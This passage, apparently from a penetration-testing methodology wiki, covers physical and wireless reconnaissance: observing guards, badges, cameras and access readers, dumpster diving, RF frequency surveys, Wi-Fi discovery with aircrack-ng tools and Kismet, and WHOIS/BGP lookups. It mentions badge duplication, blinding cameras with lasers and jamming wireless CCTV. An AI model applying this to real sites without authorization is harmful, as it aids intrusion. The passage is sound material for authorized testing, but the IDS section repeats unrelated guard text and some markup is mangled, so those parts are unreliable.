<p>Some security guards are trained and licensed to carry firearms for their own safety and for personnel they are entrusted to protect.  The use of firearms by security guards should not be a surprise, if noted.  This should be documented prior to beginning the engagement.  If firearms are observed, ensure that precaution is taken not to take any further action unless specifically authorized and trained to do so.</p>
<h6 id="badge-usage">Badge Usage</h6>
<p>Badge usage refers to a physical security method that involves the use of identification badges as a form of access control.  Badging systems may be tied to a physical access control system or simply used as a visual validation mechanism.  Observing individual badge usage is important to document.  By observing, badge usage it may be possible to actually duplicate the specific badge being utilized.  The specific items that should be noted are if the badge is required to be visible or shown to gain physical access to the property or facility.  Badge usage should be documented and if possible, include observed validation procedures.</p>
<h6 id="locking-devices">Locking devices</h6>
<p>A locking device is a mechanical or electronic mechanism often implemented to prevent unauthorized ingress or egress.  These can be as simple as a door lock, dead-bolt, or complex as a cipher lock.  Observing the type and placement location of the locking devices on doors it is possible to determine if the door in primarily used for ingress or egress.  You will need to observe what the locking devices are protecting.  All observations should be documented prior, and if possible photographs taken.</p>
<h6 id="intrusion-detection-systems-idsalarms">Intrusion detection systems (IDS)/Alarms</h6>
<p>Observing security guards (or security officer) is often the first step in assessing the most visible deterrence.  Security guards are uniformed and act to protect property by maintaining a high visibility presence to deter illegal and inappropriate actions.  By observing security guard movements directly it is possible to determine procedures in use or establish movement patterns.  You will need to observe what the security guards are protecting.  It is possible to utilize binoculars to observe any movement from a safe distance.</p>
<p>Some security guards are trained and licensed to carry firearms for their own safety and for personnel they are entrusted to protect.  The use of firearms by security guards should not be a surprise, if noted.  This should be documented prior to beginning the engagement.  If firearms are observed, ensure that precaution is taken not to take any further action unless specifically authorized and trained to do so.</p>
<h6 id="security-lighting">Security lighting</h6>
<p>Security lighting is often used as a preventative and corrective measure on a physical piece of property.  Security lighting may aid in the detection of intruders, act as deterrence to intruders, or in some cases simply to increase the feeling of safety.  Security lighting is often an integral component to the environmental design of a facility.  Security lighting includes floodlights and low pressure sodium vapor lights.  Most Security lighting that is intended to be left on all night is of the high-intensity discharge lamp variety.  Other lights may be activated by sensors such as passive infrared sensors (PIRs), turning on only when a person (or other mammal) approaches.  PIR activated lamps will usually be incandescent bulbs so that they can activate instantly; energy saving is less important since they will not be on all the time.  PIR sensor activation can increase both the deterrent effect (since the intruder knows that he has been detected) and the detection effect (since a person will be attracted to the sudden increase in light).  Some PIR units can be set up to sound a chime as well as turn on the light.  Most modern units have a photocell so that they only turn on when it is dark. </p>
<p>While adequate lighting around a physical structure is deployed to reduce the risk of an intrusion, it is critical that the lighting be implemented properly as poorly arranged lighting can actually obstruct viewing the facility they're designed to protect.  </p>
<p>Security lighting may be subject to vandalism, possibly to reduce its effectiveness for a subsequent intrusion attempt.  Thus security lights should either be mounted very high, or else protected by wire mesh or tough polycarbonate shields.  Other lamps may be completely recessed from view and access, with the light directed out through a light pipe, or reflected from a polished aluminum or stainless steel mirror.  For similar reasons high security installations may provide a stand-by power supply for their security lighting.  Observe and document the type, number, and locations of security lighting in use.</p>
<h6 id="surveillance-cctv-systems">Surveillance /CCTV systems</h6>
<p>Surveillance/CCTV systems may be used to observe activities in and around a facility from a centralized area.  Surveillance/CCTV systems may operate continuously or only when activated as required to monitor a particular event.  More advanced Surveillance/CCTV systems utilize motion-detection devices to activate the system.  IP-based Surveillance/CCTV cameras may be implemented for a more decentralized operation.</p>
<p>Surveillance/CCTV cameras can be of a conspicuous nature, which are used as a visible deterrence, as well as an inconspicuous nature.  Surveillance/CCTV cameras are generally small high definition color cameras that can not only focus to resolve minute detail, but by linking the control of the cameras to a computer, objects can be tracked semi-automatically.  Observing and documenting the Surveillance/CCTV system is critical for identifying the areas of coverage.  While it might not be possible to determine the specific camera type being utilized or even the area of coverage it is possible to identify areas with or without limited coverage.  It should be noted if the Surveillance/CCTV system is physically protected.  If not, then it needs to be documented if the Surveillance/CCTV camera is vulnerable to someone deliberately destroying it.  Additionally, a physically unprotected camera may be subject to blurring or blocking the image by spraying substances or obstructing the lens.  Lasers can be used to blind or damage Surveillance/CCTV cameras.  For wireless Surveillance/CCTV systems, broadcasting a signal at the same frequency as the wireless equipment could make it subject to jamming.</p>
<h6 id="access-control-devices">Access control devices</h6>
<p>Access control devices enable access control to areas and/or file_suport in a given facility.  Access control refers to the practice of restricting entrance to a property, a building, or a room to authorized persons.  Access control can be achieved by a human (a security guard, or receptionist), through mechanical means such as locks and keys, or through technological means such as access control systems like the Access control vestibule.</p>
<p>Access control devices historically were accomplished through keys and locks.  Electronic access control use is widely being implemented to replace mechanical keys.  Access control readers are generally classified as Basic, Semi-intelligent, and Intelligent.  A basic access control reader simply reads a card number or PIN and forward it to a control panel.  The most popular type of access control readers are RF Tiny by RFLOGICS, ProxPoint by HID, and P300 by Farpointe Data.  Semi-intelligent readers have inputs and outputs necessary to control door hardware (lock, door contact, exit button), but do not make any access decisions.  Common Semi-intelligent readers are InfoProx Lite IPL200 by CEM Systems and AP-510 by Apollo.  Intelligent readers have all the inputs and outputs necessary to control door hardware while having the memory and the processing power necessary to make access decisions independently of each other. Common Intelligent readers are the InfoProx IPO200 by CEM Systems, AP-500 by Apollo, PowerNet IP Reader by Isonas Security Systems, ID08 by Solus has the built in web service to make it user friendly, Edge ER40 reader by HID Global, LogLock and UNiLOCK by ASPiSYS Ltd, and BioEntry Plus reader by Suprema Inc.</p>
<p>Some readers may have additional features such as an LCD and function buttons for data collection purposes (i.e. clock-in/clock-out events for attendance reports), camera/speaker/microphone for intercom, and smart card read/write support.  Observe and document the type, number, and locations of access control devices in use.</p>
<h6 id="environmental-design">Environmental Design</h6>
<p>Environmental design involves the surrounding environmental of a building, or facility.  In the scope of Physical security, environmental design includes facilities geography, landscape, architecture, and exterior design.</p>
<p>Observing the facilities and surrounding areas can highlight potential areas of concern such as potential obscured areas due to geography and landscaping.  Architecture and exterior design can impact the ability of security guards to protect property by creating areas of low or no-visibility.  In addition, the placement of fences, storage containers, security guard shacks, barricades and maintenance areas could also prove useful in the ability move around a facility in a covert manner.</p>
<h5 id="employee-behavior">Employee Behavior</h5>
<p>Observing employees is often the one of the easier steps to perform.  Employee actions generally provide insight into any corporate behaviors or acceptable norms.  By observing, employees it is possible to determine procedures in use or establish ingress and egress traffic patterns.  It is possible to utilize binoculars to observe any movement from a safe distance.</p>
<h5 id="dumpster-diving">Dumpster diving</h5>
<p>Traditionally, most targets dispose of their trash in either garbage cans or dumpsters.  These may or may not be separated based upon the recyclability of the material.  The act of dumpster diving is the practice of sifting through commercial or residential trash to find items that have been discarded by their owners, but which may be useful.  This is often times an extremely dirty process that can yield significant results.  Dumpsters are usually located on private premises and therefore may subject the assessment team to potentially trespassing on property not owned by the target.  Though the law is enforced with varying degrees of rigor, ensure that this is authorized as part of the engagement.  Dumpster diving per se is often legal when not specifically prohibited by law.  Rather than take the refuse from the area, it is commonly accepted to simply photograph the obtained material and then return it to the original dumpster.</p>
<h5 id="rf-wireless-frequency-scanning">RF / Wireless Frequency scanning</h5>
<p>A band is a section of the spectrum of radio communication frequencies, in which channels are usually used or set aside for the same purpose.  To prevent interference and allow for efficient use of the radio spectrum, similar services are allocated in bands of non-overlapping ranges of frequencies.</p>
<p>As a matter of convention, bands are divided at wavelengths of 10<sup>n</sup> meters, or frequencies of 3?10<sup>n</sup> hertz.  For example, 30 MHz or 10 m divides shortwave (lower and longer) from VHF (shorter and higher).  These are the parts of the radio spectrum, and not its frequency allocation.</p>
<p>Each of these bands has a basic band plan which dictates how it is to be used and shared, to avoid interference, and to set protocol for the compatibility of transmitters and receivers.  Within the US, band plans are allocated and controlled by the Federal Communications Commission (FCC).  The chart below illustrates the current band plans.</p>
<p>[[:File:Penetration_Testing_Execution_12.png|Screenshot Here]]</p>
<p>To avoid confusion, there are two bands that we could focus on our efforts on.  The band plans that would in of interest to an attacker are indicated in the following chart.</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|align # "center"|<u>'''Band name'''</u>
|align # "center"|<u>'''Abbr'''</u>
|align # "center"|<u>'''ITU band'''</u>
|align # "center"|<u>'''Frequency and wavelength in air'''</u>
|align # "center"|<u>'''Example uses'''</u></p>
<p>|-
|Very high frequency
|VHF
|8
|30-300&nbsp;MHz<br>10 m - 1 m
|FM,&nbsp;television&nbsp;broadcasts and line-of-sight ground-to-aircraft and aircraft-to-aircraft communications.  Land Mobile and Maritime Mobile communications,&nbsp;amateur radio, weather radio</p>
<p>|-
|Ultra high frequency
|UHF
|9
|300-3000&nbsp;MHz<br>1 m - 100&nbsp;mm
|Television&nbsp;broadcasts,&nbsp;microwave&nbsp;ovens,&nbsp;mobile phones,&nbsp;wireless LAN,&nbsp;Bluetooth, ZigBee,&nbsp;GPS&nbsp;and two-way radios such as Land Mobile,&nbsp;FRS&nbsp;and&nbsp;GMRS&nbsp;radios, amateur radio</p>
<p>|}</p>
<p>A Radio Frequency (RF) site survey or wireless survey, sometimes called a wireless site survey, is the process of determining the frequencies in use within a given environment.  When conducting a RF site survey, it's very important to identify an effective range boundary, which involves determining the SNR at various points around a facility.</p>
<p>To expedite the process, all frequencies in use should be determined prior to arrival.  Particular attention should be paid to security guards, and frequencies that the target is licensed to use.  Several file_suport exist to assist in acquiring this information:</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Site'''</u>
|<u>'''URL'''</u>
|<u>'''Description'''</u></p>
<p>|-
|Radio Reference
|[<a href="http://www.radioreference.com/apps/db/">http://www.radioreference.com/apps/db/</a> <a href="http://www.radioreference.com/apps/db/">http://www.radioreference.com/apps/db/</a>]<br><br>
|Free part of the site containing a wealth of information</p>
<p>|-
|National Radio Data
|[<a href="http://www.nationalradiodata.com/">http://www.nationalradiodata.com/</a> <a href="http://www.nationalradiodata.com/">http://www.nationalradiodata.com/</a>]
|FCC database search / $29 year<br></p>
<p>|-
|Percon Corp
|[<a href="http://www.perconcorp.com/">http://www.perconcorp.com/</a> <a href="http://www.perconcorp.com">http://www.perconcorp.com</a>]
|FCC database search / Paid site - custom rates<br></p>
<p>|}</p>
<p>[[:File:Penetration_Testing_Execution_13.png|Screenshot Here]]</p>
<p>At a minimum a search engine (Google, Bing, and Yahoo!) should be utilized to conduct the following searches:</p>
<ul>
<li>"Target Company" scanner</li>
<li>"Target Company" frequency</li>
<li>"Target Company" guard frequency</li>
<li>"Target Company" MHz</li>
<li>Press releases from radio manufactures and reseller regarding the target</li>
<li>Press releases from guard outsourcing companies talking about contracts with the target company</li>
</ul>
<h4 id="frequency-usage">Frequency Usage</h4>
<p>A frequency counter is an electronic instrument that is used for measuring the number of oscillations or pulses per second in a repetitive electronic signal.  Using a Frequency counter or spectrum analyzer it is possible to identify the transmitting frequencies in use around the target facility.  Common frequencies include the following:</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Band'''</u>
|<u>'''Frequency Range'''</u></p>
<p>|-
|VHF
|150 - 174 MHz</p>
<p>|-
|UHF
|420 - 425 MHz</p>
<p>|-
|UHF
|450 - 470 MHz</p>
<p>|-
|UHF
|851 - 866 MHz</p>
<p>|-
|VHF
|43.7- 50 MHz</p>
<p>|-
|UHF
|902 - 928 MHz</p>
<p>|-
|UHF
|2400 - 2483.5 MHz</p>
<p>|}</p>
<p>A spectrum analyzer can be used to visually illustrate the frequencies in use.  These are usually targeting specific ranges that are generally more focused than a frequency counter.  Below is an output from a spectrum analyzer that can clearly illustrate the frequencies in use.  The sweep range for this analyzer is 2399-2485 MHz.</p>
<p>[[:File:Penetration_Testing_Execution_14.png|Screenshot Here]]</p>
<p>All frequency ranges in use in and around the target should be documented.</p>
<h4 id="equipment-identification">Equipment Identification</h4>
<p>As part of the on-site survey, all radios and antennas in use should be identified.  Including radio make and model as well as the length and type of antennas utilized.  A few good file_suport are available to help you identify radio equipment:</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Site'''</u>
|<u>'''URL'''</u>
|<u>'''Description'''</u></p>
<p>|-
|HamRadio Outlet
|[<a href="http://www.hamradio.com/">http://www.hamradio.com/</a> <a href="http://www.hamradio.com">http://www.hamradio.com</a>]<br>
|A great source of information for amateur radios</p>
<p>|-
|BatLabs
|[<a href="http://www.batlabs.com/">http://www.batlabs.com/</a> <a href="http://www.batlabs.com">http://www.batlabs.com</a>]<br>
|A great source of information for Motorola two way systems</p>
<p>|}</p>
<p>Identifying 802.11 equipment is usually much easier to accomplish, if not visually, then via RF emissions.  For visual identification, most vendor websites can be searched to identify the specific make and model of the equipment in use.</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Manufacturer'''</u>
|<u>'''URL'''</u></p>
<p>|-
|3com
|[<a href="http://www.3com.com/">http://www.3com.com/</a> <a href="http://www.3com.com">http://www.3com.com</a>]</p>
<p>|-
|Apple
|[<a href="http://www.apple.com/">http://www.apple.com/</a> <a href="http://www.apple.com">http://www.apple.com</a>]</p>
<p>|-
|Aruba
|[<a href="http://www.arubanetworks.com/">http://www.arubanetworks.com/</a> <a href="http://www.arubanetworks.com">http://www.arubanetworks.com</a>]</p>
<p>|-
|Atheros
|[<a href="http://www.atheros.com/">http://www.atheros.com/</a> <a href="http://www.atheros.com/">http://www.atheros.com/</a>]</p>
<p>|-
|Belkin
|[<a href="http://www.belkin.com/">http://www.belkin.com/</a> <a href="http://www.belkin.com">http://www.belkin.com</a>]</p>
<p>|-
|Bluesocket
|[<a href="http://www.bluesocket.com/">http://www.bluesocket.com/</a> <a href="http://www.bluesocket.com/">http://www.bluesocket.com/</a>]</p>
<p>|-
|Buffalo Technology
|[<a href="http://www.buffalotech.com/">http://www.buffalotech.com/</a> <a href="http://www.buffalotech.com">http://www.buffalotech.com</a>]</p>
<p>|-
|Cisco
|[<a href="http://www.cisco.com/">http://www.cisco.com/</a> <a href="http://www.cisco.com">http://www.cisco.com</a>]</p>
<p>|-
|Colubris
|[<a href="http://www.colubris.com/">http://www.colubris.com/</a> <a href="http://www.colubris.com/">http://www.colubris.com/</a>]</p>
<p>|-
|D-Link
|[<a href="http://www.dlink.com/">http://www.dlink.com/</a> <a href="http://www.dlink.com">http://www.dlink.com</a>]</p>
<p>|-
|Engenius Tech
|[<a href="http://www.engeniustech.com/">http://www.engeniustech.com/</a> <a href="http://www.engeniustech.com">http://www.engeniustech.com</a>]</p>
<p>|-
|Enterasys
|[<a href="http://www.enterasys.com/">http://www.enterasys.com/</a> <a href="http://www.enterasys.com">http://www.enterasys.com</a>]</p>
<p>|-
|Hewlett Packard
|[<a href="http://www.hp.com/">http://www.hp.com/</a> <a href="http://www.hp.com">http://www.hp.com</a>]</p>
<p>|-
|Juniper
|[<a href="http://www.juniper.net/">http://www.juniper.net/</a> <a href="http://www.juniper.net">http://www.juniper.net</a>]</p>
<p>|-
|Marvell
|[<a href="http://www.marvell.com/">http://www.marvell.com/</a> <a href="http://www.marvell.com">http://www.marvell.com</a>]</p>
<p>|-
|Motorola
|[<a href="http://www.motorola.com/">http://www.motorola.com/</a> <a href="http://www.motorola.com">http://www.motorola.com</a>]</p>
<p>|-
|Netgear
|[<a href="http://www.netgear.com/">http://www.netgear.com/</a> <a href="http://www.netgear.com">http://www.netgear.com</a>]</p>
<p>|-
|Ruckus Wireless
|[<a href="http://www.ruckuswireless.com/">http://www.ruckuswireless.com/</a> <a href="http://www.ruckuswireless.com/">http://www.ruckuswireless.com/</a>]</p>
<p>|-
|SMC
|[<a href="http://www.smc.com/">http://www.smc.com/</a> <a href="http://www.smc.com">http://www.smc.com</a>]</p>
<p>|-
|Trapeze
|[<a href="http://www.trapezenetworks.com/">http://www.trapezenetworks.com/</a> <a href="http://www.trapezenetworks.com/">http://www.trapezenetworks.com/</a>]</p>
<p>|-
|TRENDnet
|[<a href="http://www.trendnet.com/">http://www.trendnet.com/</a> <a href="http://www.trendnet.com">http://www.trendnet.com</a>]</p>
<p>|-
|Versa Technology
|[<a href="http://www.versatek.com/">http://www.versatek.com/</a> <a href="http://www.versatek.com">http://www.versatek.com</a>]</p>
<p>|}</p>
<p>In a passive manner, it is possible to identify at the manufacturer based upon data collected from RF emissions.</p>
<p>Wireless Local Area Network (WLAN) discovery consists of enumerating the type of WLAN that is currently deployed.  This can be one of the following: Unencrypted WLAN, WEP encrypted WLAN, WPA / WPA2 encrypted WLAN, LEAP encrypted WLAN, or 802.1x WLAN.  The tools required to enumerate this information are highlighted as follows.</p>
<h5 id="airmon-ng">Airmon-ng</h5>
<p>Airmon-ng is used to enable monitor mode on wireless interfaces.  It may also be used to go back from monitor mode to managed mode.  It is important to determine if our USB devices are properly detected.  For this we can use lsusb, to list the currently detected USB devices.</p>
<p>[[:File:Penetration_Testing_Execution_15.png|Screenshot Here]]</p>
<p><br>As the figure illustrates, our distribution has detected not only the Prolific PL2303 Serial Port, where we have our USB GPS connected, but also the Realtek RTL8187 Wireless Adapter.  Now that we have determined that our distribution recognizes the installed devices, we need to determine if the wireless adapter is already in monitor mode by running.</p>
<p>Entering the airmon-ng command without parameters will show the interfaces status.</p>
<p>[[:File:Penetration_Testing_Execution_16.png|Screenshot Here]]</p>
<p>To use one interface simply use airmon-ng to put your card in monitor mode by running:</p>
<pre>airmon-ng start wlan0</pre>

<p>[[:File:Penetration_Testing_Execution_17.png|Screenshot Here]]</p>
<p>If there's an existing mon0, destroy it prior to issuing the previous command:</p>
<pre>airmon-ng stop mon0</pre>

<p>Once again, entering the airmon-ng command without parameters will show the interfaces status.</p>
<p>[[:File:Penetration_Testing_Execution_18.png|Screenshot Here]]</p>
<h5 id="airodump-ng">Airodump-ng</h5>
<p>Airodump-ng is part of the Aircrack-ng is a network software suite.  Specifically, Airodump-ng is a packet sniffer that places air traffic into Packet Capture (PCAP) files or Initialization Vectors (IVS) files and shows information about wireless networks.</p>
<p>Airodump-ng is used for packet capture of raw 802.11 frames and is particularly suitable for collecting WEP IVs (Initialization Vectors) for later use with Aircrack-ng.  If you have a GPS receiver connected to the computer, Airodump-ng is capable of logging the coordinates of the found APs.  Before running Airodump-ng, start the Airmon-ng script to list the detected wireless interfaces.</p>
<p>Usage: 
<pre>airodump-ng <nowiki>&lt;</nowiki>options<nowiki>&gt;</nowiki> <nowiki>&lt;</nowiki>interface<nowiki>&gt;</nowiki> <nowiki>[</nowiki>, <nowiki>&lt;</nowiki>interface<nowiki>&gt;</nowiki>...<nowiki>]</nowiki></p>
<p>Options:</p>
<p>--ivs               : Save only captured IVs</p>
<p>--gpsd              : Use GPSd</p>
<p>--write    <nowiki>&lt;</nowiki>prefix<nowiki>&gt;</nowiki>: Dump file prefix</p>
<p>-w                  : same as --write</p>
<p>--beacons           : Record all beacons in dump file</p>
<p>--update     <nowiki>&lt;</nowiki>secs<nowiki>&gt;</nowiki>: Display update delay in seconds</p>
<p>--showack           : Prints ack/cts/rts statistics</p>
<p>-h                  : Hides known stations for --showack</p>
<p>-f          <nowiki>&lt;</nowiki>msecs<nowiki>&gt;</nowiki>: Time in ms between hopping channels</p>
<p>--berlin     <nowiki>&lt;</nowiki>secs<nowiki>&gt;</nowiki>: Time before removing the AP/client</p>
<p>from the screen when no more packets</p>
<p>are received (Default: 120 seconds)</p>
<p>-r           <nowiki>&lt;</nowiki>file<nowiki>&gt;</nowiki>: Read packets from that file</p>
<p>-x          <nowiki>&lt;</nowiki>msecs<nowiki>&gt;</nowiki>: Active Scanning Simulation</p>
<p>--output-format</p>
<p><nowiki>&lt;</nowiki>formats<nowiki>&gt;</nowiki>: Output format.  Possible values:</p>
<p>pcap, ivs, csv, gps, kismet, netxml</p>
<p>Short format "-o"</p>
<p>The option can be specified multiple   times.  In this case, each file format specified will be output.  Only ivs or pcap can be used, not both.</pre></p>
<p>Airodump-ng will display a list of detected APs and a list of connected clients ("stations").</p>
<p>[[:File:Penetration_Testing_Execution_19.png|Screenshot Here]]</p>
<p>[[:File:Penetration_Testing_Execution_20.png|Screenshot Here]]</p>
<p>The first line shows the current channel, elapsed running time, current date and optionally if a WPA/WPA2 handshake was detected.</p>
<h5 id="kismet-newcore">Kismet-Newcore</h5>
<p>Kismet-newcore is a network detector, packet sniffer, and intrusion detection system for 802.11 wireless LANs.  Kismet will work with any wireless card which supports raw monitoring mode, and can sniff 802.11a, 802.11b, 802.11g, and 802.11n traffic.</p>
<p>Kismet identifies networks by passively collecting packets and detecting standard named networks, detecting (and given time, decloaking) hidden networks, and inferring the presence of nonbeaconing networks via data traffic.</p>
<p>Kismet is composed of 3 parts:</p>
<ul>
<li>'''Drones: '''Capture the wireless traffic to report it to the server; they have to be started manually.</li>
<li>'''Server: '''Central place that connects to the drones and accepts client connections.  It can also capture wireless traffic.</li>
<li>'''Client: '''The GUI part that will connect to the server.</li>
</ul>
<p>Kismet has to be configured to work properly.  First, we need to determine if it is already in monitor mode by running:</p>
<pre>airmon-ng</pre>

<p>[[:File:Penetration_Testing_Execution_21.png|Screenshot Here]]</p>
<p>To use one interface simply use airmon-ng to put your card in monitor mode by running:</p>
<pre>airmon-ng start wlan0</pre>

<p>[[:File:Penetration_Testing_Execution_22.png|Screenshot Here]]</p>
<p>If there's an existing mon0, destroy it prior to issuing the previous command:</p>
<pre>airmon-ng stop mon0</pre>

<p>Kismet is able to use more than one interface like Airodump-ng.  To use that feature, /etc/kismet/kismet.conf has to be edited manually as airmon-ng cannot configure more than one interface for kismet.  For each adapter, add a source line into kismet.conf.</p>
<p>Note:''' '''By default kismet stores its capture files in the directory where it is started.  These captures can be used with Aircrack-ng.</p>
<p>Typing, "kismet" in a console and hitting "Enter" will start up Kismet.</p>
<p>[[:File:Penetration_Testing_Execution_23.png|Screenshot Here]]</p>
<p>As described earlier Kismet consists of three components and the initial screen informs us that we need to either start the Kismet server or choose to use a server that has been started elsewhere.  For our purposes. we will click "Yes" to start the Kismet server locally.</p>
<p>[[:File:Penetration_Testing_Execution_24.png|Screenshot Here]]</p>
<p>Kismet presents us with the options to choose as part of the server startup process.</p>
<p>[[:File:Penetration_Testing_Execution_25.png|Screenshot Here]]</p>
<p>Unless we configured a source in /etc/kismet/kismet.conf then we will need to specify a source from where we want to capture packets.</p>
<p>[[:File:Penetration_Testing_Execution_26.png|Screenshot Here]]</p>
<p>As referenced earlier, we created a monitor sub-interface from our wireless interface.  For our purposes, we will enter "mon0", though your interface may have a completely different name.</p>
<p>[[:File:Penetration_Testing_Execution_27.png|Screenshot Here]]</p>
<p><br>When Kismet server and client are running properly then wireless networks should start to show up.  We have highlighted a WEP enabled network.  There are numerous sorting options that you can choose from.  We will not cover all the functionality of Kismet at this point, but if you're not familiar with the interface you should play with it until you get comfortable.</p>
<h5 id="inssider">inSSIDer</h5>
<p>If you are used to using Netstumbler you may be disappointed to hear that it doesn't function properly with Windows Vista and 7 (64-bit).  That being said, all is not lost as there is an alternative that is compatible with Windows XP, Vista and 7 (32 and 64-bit).  It makes use of the native Wi-Fi API and is compatible with most GPS devices (NMEA v2.3 and higher).  InSSIDer has some features that make it the tool of choice if you're using Windows.  InSSIDer can track the strength of received signal in dBi over time, filter access points, and also export Wi-Fi and GPS data to a KML file to view in Google Earth.</p>
<p>[[:File:Penetration_Testing_Execution_28.png|Screenshot Here]]</p>
<h3 id="external-footprinting">External Footprinting</h3>
<p>The External Footprinting phase of Intelligence Gathering involves collecting response results from a target based upon direct interaction from an external perspective.  The goal is to gather as much information about the target as possible.</p>
<h4 id="identifying-ip-ranges">Identifying IP Ranges</h4>
<p>For external footprinting, we first need to determine which one of the WHOIS servers contains the information we're after.  Given that we should know the TLD for the target domain, we simply have to locate the Registrar that the target domain is registered with.</p>
<p>WHOIS information is based upon a tree hierarchy.  ICANN (IANA) is the authoritative registry for all of the TLDs and is a great starting point for all manual WHOIS queries.</p>
<h5 id="whois-lookup">WHOIS lookup</h5>
<ul>
<li>ICANN - <a href="http://www.icann.org">http://www.icann.org</a></li>
<li>IANA - <a href="http://www.iana.com">http://www.iana.com</a></li>
<li>NRO - <a href="http://www.nro.net">http://www.nro.net</a></li>
<li>AFRINIC - <a href="http://www.afrinic.net">http://www.afrinic.net</a></li>
<li>APNIC - <a href="http://www.apnic.net">http://www.apnic.net</a></li>
<li>ARIN - <a href="http://ws.arin.net">http://ws.arin.net</a></li>
<li>LACNIC - <a href="http://www.lacnic.net">http://www.lacnic.net</a></li>
<li>RIPE - <a href="http://www.ripe.net">http://www.ripe.net</a></li>
</ul>
<p>Once the appropriate Registrar was queried we can obtain the Registrant information.  There are numerous sites that offer WHOIS information; however for accuracy in documentation, you need to use only the appropriate Registrar.</p>
<ul>
<li>InterNIC - <a href="http://www.internic.net/">http://www.internic.net/</a> <a href="http://www.internic.net">http://www.internic.net</a>]</li>
</ul>
<h5 id="bgp-looking-glasses">BGP looking glasses</h5>
<p>It is possible to identify the Autonomous System Number (ASN) for networks that participate in Border Gateway Protocol (BGP).  Since BGP route paths are advertised throughout the world we can find these by using a BGP4 and BGP6 looking glass.</p>
<ul>
<li>BGP4 -  [<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> http][<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> ://][<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> www][<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> .][<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> bgp][<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> 4.][<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> as][<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> /][<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> looking][<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> -][<a href="http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg">http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&amp;sa#D&amp;sntz#1&amp;usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg</a> glasses]</u></li>
<li>BPG6 - [<a href="http://lg.he.net/">http://lg.he.net/</a> <a href="http://lg.he.net/">http://lg.he.net/</a>]</li>
</ul>
<h4 id="active-reconnaissance">Active Reconnaissance</h4>
